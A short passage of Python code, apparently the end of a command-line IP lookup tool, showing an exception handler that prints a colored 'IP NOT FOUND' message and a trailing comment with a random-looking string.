            Main()
        else:print(f"\t{red}[!] {white}IP NOT FOUND!")
    except Exception as e:print(e)

# 93858eyfoisdhgfjs8y
